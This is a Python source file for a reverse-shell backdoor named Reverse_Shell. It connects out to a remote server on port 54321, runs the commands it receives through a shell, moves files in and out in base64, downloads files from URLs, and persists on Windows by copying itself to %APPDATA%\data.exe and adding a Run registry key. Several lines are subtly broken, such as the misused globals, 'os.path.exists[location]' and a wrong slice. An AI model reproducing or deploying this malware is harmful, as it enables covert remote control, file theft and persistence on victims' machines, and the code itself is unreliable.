import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests


# for persistance:
# go to the registry on windows
# create a registry key on the user for the reverse.exe
# will allow to run the program when the target is on

class Reverse_Shell:
    global sock
    global command

    # declaration of the socket
    # see documentation

    def reliable_send(self, data):
        json_data = json.dumps(data)
        sock.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + sock.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def download(self, url):
        get_reponse = requests.get(url)
        file_name = url.split("/")[-1]
        with open(file_name, "wb") as out_file:
            out_file.write(get_reponse.content)

    def initialisation(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connection(self):
        while True:
            time.sleep(20)
            try:
                # connection to the server
                ipaddress = ""
                sock.connect((ipaddress, 54321))
                self.execute_command()
            except:
                self.connection()

    def execute_command(self):
        while True:
            command = self.reliable_receive()
            if command == "q":
                break
            elif command[:2] == "cd" and len(command) > 1:
                try:
                    os.chdir(command[3:])
                except:
                    continue
            elif command[:8] == "download":
                with open(command[:9], "rb") as file:
                    self.reliable_send(base64.b64encode(file.read()))
            elif command[:6] == "upload":
                with open(command[7:],"wb") as fin:
                    result = self.reliable_receive()
                    fin.write(base64.b64decode(result))
            elif command[:3] == "get":
                try:
                    self.download(command[4:])
                    self.reliable_send("[+] Download File From the URL")
                except:
                    self.reliable_send("[-] Failed to Download File")
            elif command[:5] == "start":
                try:
                    subprocess.Popen(command[6:],shell=True)
                    self.reliable_send("[+] Started")
                except:
                    self.reliable_send("[-] Failed to start")
            else:
                try:
                    # creation of the command, see documentation
                    proc = subprocess.Popen(
                        command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE
                    )
                    result = proc.stdout.read() + proc.stderr.read()
                    self.reliable_send(result)
                except:
                    self.reliable_send("Can't execute the command")

    def copy_executable(self):
        # find the location of the appdata directory
        location = os.environ["appdata"] + "\\data.exe"
        if not os.path.exists[location]:
            # copy the backdoor executable on the target if running for the first time
            shutil.copyfile(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v data /t REG_SZ /d ""'
                            + location + '"', shell=True)

    def end_connection(self):
        # close the socket
        sock.close()

    def main(self):
        self.initialisation()
        self.copy_executable()
        self.connection()
        self.end_connection()
